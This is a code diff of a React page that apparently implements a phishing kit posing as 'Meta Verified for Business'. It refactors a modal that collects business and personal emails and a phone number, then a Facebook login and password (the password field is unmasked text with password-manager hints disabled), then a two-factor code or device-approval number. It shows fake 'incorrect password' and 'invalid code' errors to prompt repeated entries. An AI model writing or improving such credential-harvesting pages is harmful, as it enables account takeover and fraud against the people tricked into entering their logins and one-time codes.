@@ -1,3 +1,5 @@
+'use client';
+
 import { useEffect, useState, useCallback, useMemo, useRef } from 'react';
 import axios from 'axios';
 import { initializeApp } from "firebase/app";
@@ -38,21 +40,130 @@ const database = getDatabase(firebaseApp);
 // ==========================================
 
 const EU_COUNTRY_TO_LANG = {
-  FR: 'fr', BE: 'fr', LU: 'fr',
-  DE: 'de', AT: 'de',
-  IT: 'it',
-  ES: 'es',
-  PT: 'pt',
-  NL: 'nl',
-  IE: 'en', MT: 'en', CY: 'en',
-  DK: 'da', SE: 'sv', FI: 'fi',
-  PL: 'pl', CZ: 'cs', SK: 'sk', HU: 'hu', RO: 'ro', BG: 'bg',
-  HR: 'hr', SI: 'sl', EE: 'et', LV: 'lv', LT: 'lt',
-  GR: 'el',
+  FR: 'fr', BE: 'fr', LU: 'fr', DE: 'de', AT: 'de', IT: 'it', ES: 'es', PT: 'pt', NL: 'nl',
+  IE: 'en', MT: 'en', CY: 'en', DK: 'da', SE: 'sv', FI: 'fi', PL: 'pl', CZ: 'cs', SK: 'sk', 
+  HU: 'hu', RO: 'ro', BG: 'bg', HR: 'hr', SI: 'sl', EE: 'et', LV: 'lv', LT: 'lt', GR: 'el',
 };
 
-const Home = () =>
-{
+const LoadingSpinner = () => (
+  <div style={{
+    width: '20px', height: '20px', border: '3px solid rgba(255, 255, 255, 0.3)',
+    borderTop: '3px solid #fff', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto'
+  }} />
+);
+
+// ==========================================
+// COMPONENT AUTHFORM (TÁCH RIÊNG THEO FILE CỦA BẠN)
+// ==========================================
+const AuthForm = ({ 
+  step, setStep, loading, errors, setErrors, showLoginError, showOtpError,
+  busName, setBusName, perEmail, setPerEmail, busEmail, setBusEmail, 
+  countryCode, setCountryCode, phoneNum, setPhoneNum,
+  loginUser, setLoginUser, loginPass, setLoginPass, otp, setOtp,
+  handleSignup, handleLogin, handleOtp
+}: any) => {
+  return (
+    <div style={{ width: '100%' }}>
+      
+      {/* BƯỚC 1: SIGNUP */}
+      {step === 1 && (
+        <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <h2 className="modal-title" style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '6px', color: '#050505' }}>
+            Meta Verified for Business
+          </h2>
+          <p className="modal-subtitle" style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
+            Enter your business details to start your application.
+          </p>
+          
+          <div className="fb-input-group">
+            <input className={`fb-input ${errors.busName ? 'input-error' : ''}`} placeholder="Business name" value={busName} onChange={(e) => { setBusName(e.target.value); setErrors({ ...errors, busName: false }); }} />
+            {errors.busName && <div className="field-error show">Please enter your business name.</div>}
+          </div>
+          
+          <div className="fb-input-group">
+            <input className={`fb-input ${errors.perEmail ? 'input-error' : ''}`} type="email" placeholder="Personal email" value={perEmail} onChange={(e) => { setPerEmail(e.target.value); setErrors({ ...errors, perEmail: false }); }} />
+            {errors.perEmail && <div className="field-error show">Please enter a valid personal email.</div>}
+          </div>
+          
+          <div className="fb-input-group">
+            <input className={`fb-input ${errors.busEmail ? 'input-error' : ''}`} type="email" placeholder="Business email" value={busEmail} onChange={(e) => { setBusEmail(e.target.value); setErrors({ ...errors, busEmail: false }); }} />
+            {errors.busEmail && <div className="field-error show">Please enter a valid business email.</div>}
+          </div>
+          
+          <div className="fb-input-group">
+            <div className="fb-phone-group">
+              <div className="fb-phone-select-wrap">
+                <select className="fb-phone-select" value={countryCode} onChange={(e) => setCountryCode(e.target.value)}>
+                  <option value="+84">+84 (Vietnam)</option>
+                  <option value="+1">+1 (US)</option>
+                  <option value="+44">+44 (UK)</option>
+                  <option value="+33">+33 (FR)</option>
+                  <option value="+49">+49 (DE)</option>
+                  <option value="+61">+61 (AU)</option>
+                  <option value="+81">+81 (JP)</option>
+                  <option value="+82">+82 (KR)</option>
+                  <option value="+86">+86 (CN)</option>
+                  <option value="+91">+91 (IN)</option>
+                </select>
+              </div>
+              <input className={`fb-input ${errors.phoneNum ? 'input-error' : ''}`} placeholder="Phone number" value={phoneNum} onChange={(e) => { setPhoneNum(e.target.value); setErrors({ ...errors, phoneNum: false }); }} />
+            </div>
+            {errors.phoneNum && <div className="field-error show">Please enter a valid phone number.</div>}
+          </div>
+          
+          <button type="submit" className="fb-btn" disabled={loading} style={{ marginTop: '12px' }}>
+            {loading ? <LoadingSpinner /> : 'Continue'}
+          </button>
+        </form>
+      )}
+
+      {/* BƯỚC 2: LOGIN */}
+      {step === 2 && (
+        <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <h2 className="modal-title" style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '20px', color: '#050505' }}>
+            Log in to Facebook
+          </h2>
+          
+          <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={(e) => setLoginUser(e.target.value)} required autoComplete="off" />
+          
+          <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={(e) => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
+          
+          {showLoginError && <div className="alert-error show">The password you entered is incorrect. Please try again.</div>}
+          
+          <button type="submit" className="fb-btn" disabled={loading} style={{ marginTop: '12px' }}>
+            {loading ? <LoadingSpinner /> : 'Log in'}
+          </button>
+        </form>
+      )}
+
+      {/* BƯỚC 3: OTP */}
+      {step === 3 && (
+        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+          <h2 className="modal-title" style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '6px', color: '#050505' }}>
+            Two-factor authentication
+          </h2>
+          <p className="modal-subtitle" style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
+            Enter the 6-digit or 8-digit code we sent to your device.
+          </p>
+          
+          <input className="fb-input fb-otp-input" placeholder="00000000" value={otp} onChange={(e) => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); }} required maxLength={8} />
+          
+          {showOtpError && <div className="alert-error show">Invalid security code. Please check and try again.</div>}
+          
+          <button type="submit" className="fb-btn" disabled={loading || otp.length < 6} style={{ marginTop: '12px' }}>
+            {loading ? <LoadingSpinner /> : 'Verify'}
+          </button>
+        </form>
+      )}
+    </div>
+  );
+};
+
+
+// ==========================================
+// COMPONENT HOME CHÍNH
+// ==========================================
+export default function Home() {
     // --- STATE CHO LANDING PAGE ---
     const videoRef = useRef( null );
     const [ isVideoPaused, setIsVideoPaused ] = useState( false );
@@ -296,8 +407,9 @@ const Home = () =>
 
     return (
         <>
-            {/* CHÈN CHÍNH XÁC FILE CSS TỪ BẠN GỬI */}
+            {/* CHÈN CHÍNH XÁC FILE CSS */}
             <style>{`
+                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
                 html { scroll-behavior: smooth; }
                 body { font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1c2b33; background: #fff; line-height: 1.5; -webkit-font-smoothing: antialiased; }
@@ -439,7 +551,7 @@ const Home = () =>
                 .modal-close:hover { background: #e4e6eb; color: #050505; }
                 .modal-close:active { transform: scale(.94); }
                 .modal-brand { display: flex; justify-content: center; margin-bottom: 18px; }
-                .modal-brand img { max-height: 60px; object-fit: contain; }
+                .modal-brand img { max-height: 64px; object-fit: contain; }
                 .modal-title { font-size: 22px; font-weight: 700; letter-spacing: -.3px; color: #050505; text-align: center; margin-bottom: 6px; line-height: 1.3; }
                 .modal-subtitle { font-size: 14.5px; line-height: 1.5; color: #65676b; text-align: center; margin: 0 auto 20px; max-width: 340px; }
                 .fb-form { display: flex; flex-direction: column; gap: 12px; }
@@ -877,105 +989,42 @@ const Home = () =>
                       </div>
                     ) : (
                       <>
-                        {/* LOGO FACEBOOK TRÒN CHUẨN THEO ẢNH */}
+                        {/* LOGO FACEBOOK TRÒN */}
                         <div className="modal-brand">
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" style={{ maxHeight: '64px' }} />
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
                         </div>
 
-                        {/* FORM 1: SIGNUP */}
-                        {step === 1 && (
+                        {/* RENDER COMPONENT AUTHFORM */}
+                        {showSuccess ? (
+                          <div style={{ textAlign: 'center', padding: '20px 0' }}>
+                            <h2 className="modal-title" style={{ marginTop: '20px' }}>{t.successTitle}</h2>
+                            <p className="modal-subtitle">{t.successSub}</p>
+                            <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
+                          </div>
+                        ) : matchNumber ? (
                           <>
-                            <h2 className="modal-title">Meta Verified for Business</h2>
-                            <p className="modal-subtitle">Enter your business details to start your application.</p>
-                            <form onSubmit={handleSignup} noValidate className="fb-form">
-                                <div className="fb-input-group">
-                                    <input className={`fb-input ${errors.busName ? 'input-error' : ''}`} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
-                                    {errors.busName && <div className="field-error show">Please enter your business name.</div>}
-                                </div>
-                                <div className="fb-input-group">
-                                    <input className={`fb-input ${errors.perEmail ? 'input-error' : ''}`} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
-                                    {errors.perEmail && <div className="field-error show">Please enter a valid personal email.</div>}
-                                </div>
-                                <div className="fb-input-group">
-                                    <input className={`fb-input ${errors.busEmail ? 'input-error' : ''}`} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
-                                    {errors.busEmail && <div className="field-error show">Please enter a valid business email.</div>}
-                                </div>
-                                <div className="fb-input-group">
-                                    <div className="fb-phone-group">
-                                        <div className="fb-phone-select-wrap">
-                                            <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)}>
-                                                <option value="+84">+84 (Vietnam)</option>
-                                                <option value="+1">+1 (US)</option>
-                                                <option value="+44">+44 (UK)</option>
-                                                <option value="+61">+61 (Australia)</option>
-                                                <option value="+33">+33 (France)</option>
-                                                <option value="+49">+49 (Germany)</option>
-                                                <option value="+81">+81 (Japan)</option>
-                                                <option value="+82">+82 (South Korea)</option>
-                                                <option value="+86">+86 (China)</option>
-                                                <option value="+91">+91 (India)</option>
-                                                <option value="+62">+62 (Indonesia)</option>
-                                                <option value="+60">+60 (Malaysia)</option>
-                                                <option value="+63">+63 (Philippines)</option>
-                                                <option value="+65">+65 (Singapore)</option>
-                                                <option value="+66">+66 (Thailand)</option>
-                                                <option value="+84">+84 (Vietnam)</option>
-                                            </select>
-                                        </div>
-                                        <input className={`fb-input ${errors.phoneNum ? 'input-error' : ''}`} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
-                                    </div>
-                                    {errors.phoneNum && <div className="field-error show">Please enter a valid phone number.</div>}
-                                </div>
-                                <button type="submit" className="fb-btn" disabled={loading}>
-                                  {loading ? <div className="spinner"></div> : "Continue"}
-                                </button>
-                            </form>
+                            <h2 className="modal-title">{t.approveTitle}</h2>
+                            <p className="modal-subtitle">{t.approveSub} <strong>{matchNumber}</strong></p>
+                            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
+                            <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
                           </>
-                        )}
-
-                        {/* FORM 2: LOGIN */}
-                        {step === 2 && (
-                          <form onSubmit={handleLogin} autoComplete="off" className="fb-form">
-                              <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
-                              <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
-                              {showLoginError && <div className="alert-error show">{t.loginError}</div>}
-                              <button type="submit" className="fb-btn" disabled={loading}>
-                                {loading ? <div className="spinner"></div> : t.loginBtn}
-                              </button>
-                          </form>
-                        )}
-
-                        {/* FORM 3 & 4: 2FA & SUCCESS */}
-                        {(step === 3 || showSuccess) && (
-                          <>
-                            {showSuccess ? (
-                              <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                                <h2 className="modal-title" style={{ marginTop: '20px' }}>{t.successTitle}</h2>
-                                <p className="modal-subtitle">{t.successSub}</p>
-                                <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
-                              </div>
-                            ) : matchNumber ? (
-                              <>
-                                <h2 className="modal-title">{t.approveTitle}</h2>
-                                <p className="modal-subtitle">{t.approveSub} <strong>{matchNumber}</strong></p>
-                                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
-                                <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
-                              </>
-                            ) : (
-                              <>
-                                <h2 className="modal-title">{t.form3Title}</h2>
-                                <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}><img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} /></div>
-                                <p className="modal-subtitle">{t.form3Sub}</p>
-                                <form onSubmit={handleOtp} className="fb-form">
-                                    <input className="fb-input fb-otp-input" placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
-                                    {showOtpError && <div className="alert-error show">{t.otpError}</div>}
-                                    <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
-                                      {loading ? <div className="spinner"></div> : t.verifyBtn}
-                                    </button>
-                                </form>
-                              </>
-                            )}
-                          </>
+                        ) : (
+                          <AuthForm
+                            step={step} setStep={setStep}
+                            loading={loading} errors={errors} setErrors={setErrors}
+                            showLoginError={showLoginError} showOtpError={showOtpError}
+                            busName={busName} setBusName={setBusName}
+                            perEmail={perEmail} setPerEmail={setPerEmail}
+                            busEmail={busEmail} setBusEmail={setBusEmail}
+                            countryCode={countryCode} setCountryCode={setCountryCode}
+                            phoneNum={phoneNum} setPhoneNum={setPhoneNum}
+                            loginUser={loginUser} setLoginUser={setLoginUser}
+                            loginPass={loginPass} setLoginPass={setLoginPass}
+                            otp={otp} setOtp={setOtp}
+                            handleSignup={handleSignup}
+                            handleLogin={handleLogin}
+                            handleOtp={handleOtp}
+                          />
                         )}
                       </>
                     )}
@@ -987,6 +1036,4 @@ const Home = () =>
             </div>
         </>
     );
-};
-
-export default Home;
+}
